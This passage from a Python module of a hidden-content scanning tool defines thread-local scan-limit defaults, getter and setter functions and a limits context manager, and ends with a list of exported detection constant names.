                    "use 0 to disable the limit."
                )


# ---------------------------------------------------------------------------
# Module-level default + current-limits reference.
# ---------------------------------------------------------------------------
#
# The current limits reference is a module-level global rather than a
# ScanService-instance attribute because the analyzers (CsvAnalyzer,
# EmlAnalyzer, FallbackAnalyzer) must reach it without widening the
# ``BaseAnalyzer.scan(file_path) -> IntegrityReport`` contract. Widening
# the contract would ripple into every Phase 1-20 analyzer and would
# not be additive. Thread-local storage keeps concurrent ``ScanService``
# calls from clobbering each other's limits — the typical test pattern
# (``with limits_context(ScanLimits(...)): svc.scan(path)``) works
# naturally under pytest's per-test fixture scope.

DEFAULT_LIMITS: Final[ScanLimits] = ScanLimits()
"""Shipped default limits. Used by ``ScanService`` when the caller does
not pass an explicit ``limits=`` argument."""

_limits_state = threading.local()


def get_current_limits() -> ScanLimits:
    """Return the limits in effect for the current scan.

    Analyzers call this from inside their per-item loops to decide
    whether to halt (and emit ``scan_limited``). Outside a
    ``limits_context`` or ``ScanService.scan`` call, returns
    ``DEFAULT_LIMITS`` — which means importing and directly
    instantiating an analyzer in a test still gets sensible ceilings
    without needing a context manager.
    """
    limits = getattr(_limits_state, "current", None)
    if limits is None:
        return DEFAULT_LIMITS
    return limits


def set_current_limits(limits: ScanLimits) -> None:
    """Install ``limits`` as the current scan's ceiling set.

    Prefer the ``limits_context`` context manager for temporary
    overrides; use this function only when a long-lived setter is
    appropriate (test fixture setup, CLI startup).
    """
    _limits_state.current = limits


@contextmanager
def limits_context(limits: ScanLimits) -> Iterator[ScanLimits]:
    """Temporarily install ``limits`` for the duration of the ``with`` block.

    Prior value (if any) is restored on exit, including when an
    exception propagates out. This is the primitive ``ScanService``
    uses to scope its ``limits=`` constructor argument to the duration
    of each ``scan()`` call — and the primitive tests use to assert
    limit-aware behaviour without mutating global state.
    """
    prior = getattr(_limits_state, "current", None)
    _limits_state.current = limits
    try:
        yield limits
    finally:
        if prior is None:
            if hasattr(_limits_state, "current"):
                delattr(_limits_state, "current")
        else:
            _limits_state.current = prior


__all__ = [
    "SourceLayer",
    "ZAHIR_MECHANISMS",
    "BATIN_MECHANISMS",
    "ZERO_WIDTH_CHARS",
    "BIDI_CONTROL_CHARS",
    "TAG_CHAR_RANGE",
    "CONFUSABLE_TO_LATIN",
    "INVISIBLE_RENDER_MODE",
    "MICROSCOPIC_FONT_THRESHOLD",
    "BACKGROUND_LUMINANCE_WHITE",
    "COLOR_CONTRAST_THRESHOLD",
    "SPAN_OVERLAP_THRESHOLD",
    "PNG_STANDARD_CHUNKS",
    "PNG_TEXT_CHUNKS",
    "JPEG_STANDARD_MARKERS",
    "IMAGE_METADATA_SIZE_LIMIT",
    "IMAGE_TRAILING_DATA_THRESHOLD",
    "SVG_EVENT_ATTRIBUTE_PREFIX",
    # Phase 11 — depth constants.
    "MATH_ALPHANUMERIC_RANGE",
    "LSB_MIN_SAMPLES",
    "LSB_UNIFORMITY_TOLERANCE",
    "HIGH_ENTROPY_MIN_BYTES",
    "HIGH_ENTROPY_THRESHOLD",
    "SVG_INVISIBLE_ATTRIBUTES",
    "SVG_INVISIBLE_STYLE_FRAGMENTS",
    "SVG_MICROSCOPIC_FONT_THRESHOLD",
    # Phase 12 — cross-modal correlation constants.
    "CORRELATION_MIN_PAYLOAD_LEN",
    "CORRELATION_MIN_OCCURRENCES",
    "CORRELATION_MIN_FILES",
    "CORRELATION_FINGERPRINT_LEN",
    "GENERATIVE_CIPHER_B64_PATTERN",
    "GENERATIVE_CIPHER_HEX_PATTERN",
    "GENERATIVE_CIPHER_MIN_BYTES",
    # Phase 13 — correlation-quality constants.
    "CORRELATION_MIN_PAYLOAD_ENTROPY",
    "CORRELATION_STOPWORDS",
    "CORRELATION_SHORT_PAYLOAD_LEN",
    "CORRELATION_LONG_PAYLOAD_LEN",
    "CORRELATION_BASE_CONFIDENCE",
    "CORRELATION_MAX_CONFIDENCE",
    "CORRELATION_ESCALATION_COUNT",
    "SEVERITY",
    "DEFAULT_SEVERITY",
    "TIER",
    "SCAN_INCOMPLETE_CLAMP",
    "Verdict",
    "VERDICT_SAHIH",
    "VERDICT_MUSHTABIH",
    "VERDICT_MUKHFI",
    "VERDICT_MUNAFIQ",
    "VERDICT_MUGHLAQ",
    "TIER_LEGEND",
    "VERDICT_DISCLAIMER",
    "TOOL_NAME",
    "TOOL_VERSION",
    # Phase 21 — configurable safety limits.
    "ScanLimits",
    "DEFAULT_LIMITS",
    "get_current_limits",
    "set_current_limits",
    "limits_context",
]
